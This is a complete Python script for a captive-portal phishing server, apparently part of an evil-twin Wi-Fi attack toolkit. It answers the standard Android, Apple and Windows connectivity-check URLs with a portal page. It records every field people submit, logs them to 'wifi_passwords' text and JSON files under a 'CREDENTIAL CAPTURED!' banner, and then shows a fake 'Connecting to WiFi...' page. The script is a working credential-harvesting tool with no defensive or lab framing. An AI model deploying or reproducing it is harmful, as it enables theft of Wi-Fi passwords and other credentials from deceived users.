#!/usr/bin/env python3
"""
Captive Portal Web Server with Credential Capture
Serves portal HTML and captures POST submissions in real-time
"""

import http.server
import urllib.parse
import os
import sys
import json
from datetime import datetime
from pathlib import Path

# Configuration from environment or defaults
PORTAL_DIR = os.environ.get('PORTAL_DIR', '/tmp/portal')
CRED_LOG_DIR = os.environ.get('CRED_LOG_DIR', '/tmp/credentials')
REDIRECT_URL = os.environ.get('REDIRECT_URL', 'https://www.google.com')
BIND_ADDR = os.environ.get('BIND_ADDR', '10.0.0.1')
BIND_PORT = int(os.environ.get('BIND_PORT', '80'))

# Color codes for terminal output
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
CYAN = '\033[0;36m'
WHITE = '\033[1;37m'
NC = '\033[0m'

# Ensure log directory exists
Path(CRED_LOG_DIR).mkdir(parents=True, exist_ok=True)

# Log file path
LOG_FILE = os.path.join(CRED_LOG_DIR, f"wifi_passwords_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt")


class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP handler for captive portal"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=PORTAL_DIR, **kwargs)

    def log_message(self, format, *args):
        """Custom log output for connections"""
        client_ip = self.client_address[0]
        msg = format % args
        # Show client connections in real-time
        if 'POST' in msg:
            return  # POST logs are handled separately
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{CYAN}[{timestamp}]{NC} {WHITE}Client:{NC} {client_ip} -> {msg}")

    def do_GET(self):
        """Handle GET requests - serve portal pages"""
        client_ip = self.client_address[0]
        timestamp = datetime.now().strftime('%H:%M:%S')

        # Captive portal detection endpoints - return portal
        captive_paths = [
            '/generate_204',
            '/gen_204',
            '/hotspot-detect.html',
            '/connecttest.txt',
            '/success.txt',
            '/ncsi.txt',
            '/redirect',
            '/library/test/success.html',
        ]

        if self.path in captive_paths or self.path == '/':
            self.path = '/index.html'

        # Check if file exists, otherwise serve index.html
        file_path = os.path.join(PORTAL_DIR, self.path.lstrip('/'))
        if not os.path.exists(file_path):
            self.path = '/index.html'

        print(f"{CYAN}[{timestamp}]{NC} {WHITE}Page view:{NC} {client_ip} -> {self.path}")
        return super().do_GET()

    def do_POST(self):
        """Handle POST requests - capture credentials"""
        client_ip = self.client_address[0]
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        timestamp_short = datetime.now().strftime('%H:%M:%S')

        # Read POST data
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)

        # Extract all submitted fields
        credentials = {}
        for key, values in params.items():
            credentials[key] = values[0] if values else ''

        # Get user agent
        user_agent = self.headers.get('User-Agent', 'Unknown')

        # Real-time terminal output
        print(f"\n{GREEN}{'='*60}{NC}")
        print(f"{GREEN}[{timestamp_short}] CREDENTIAL CAPTURED!{NC}")
        print(f"{GREEN}{'='*60}{NC}")
        print(f"{WHITE}  IP Address:{NC}  {client_ip}")
        for key, value in credentials.items():
            label = key.capitalize()
            print(f"{WHITE}  {label}:{NC}  {YELLOW}{value}{NC}")
        print(f"{WHITE}  User Agent:{NC} {user_agent[:60]}")
        print(f"{GREEN}{'='*60}{NC}\n")

        # Write to log file
        with open(LOG_FILE, 'a') as f:
            f.write(f"{'='*50}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"IP Address: {client_ip}\n")
            for key, value in credentials.items():
                f.write(f"{key.capitalize()}: {value}\n")
            f.write(f"User Agent: {user_agent}\n")
            f.write(f"{'='*50}\n\n")

        # Also save as JSON for programmatic access
        json_log = os.path.join(CRED_LOG_DIR, 'latest_capture.json')
        capture_data = {
            'timestamp': timestamp,
            'ip': client_ip,
            'credentials': credentials,
            'user_agent': user_agent
        }
        with open(json_log, 'w') as f:
            json.dump(capture_data, f, indent=2)

        # Send redirect response
        redirect_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
    <meta http-equiv="refresh" content="3;url={REDIRECT_URL}">
    <style>
        body {{
            font-family: -apple-system, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background: #f0f2f5;
        }}
        .message {{
            background: white;
            padding: 40px 60px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
        }}
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        h2 {{ color: #1a1a1a; margin: 0 0 8px 0; }}
        p {{ color: #65676b; margin: 0; }}
    </style>
</head>
<body>
    <div class="message">
        <div class="spinner"></div>
        <h2>Connecting to WiFi...</h2>
        <p>You will be redirected shortly.</p>
    </div>
</body>
</html>"""

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', len(redirect_html))
        self.end_headers()
        self.wfile.write(redirect_html.encode())


def main():
    print(f"\n{GREEN}{'='*60}{NC}")
    print(f"{GREEN}  Captive Portal Server Started{NC}")
    print(f"{GREEN}{'='*60}{NC}")
    print(f"{WHITE}  Listening:{NC}    http://{BIND_ADDR}:{BIND_PORT}")
    print(f"{WHITE}  Portal Dir:{NC}   {PORTAL_DIR}")
    print(f"{WHITE}  Credential Log:{NC} {LOG_FILE}")
    print(f"{WHITE}  Redirect URL:{NC}  {REDIRECT_URL}")
    print(f"{GREEN}{'='*60}{NC}")
    print(f"{YELLOW}  Waiting for connections...{NC}\n")

    server = http.server.HTTPServer((BIND_ADDR, BIND_PORT), CaptivePortalHandler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Server shutting down...{NC}")
        server.shutdown()


if __name__ == '__main__':
    main()
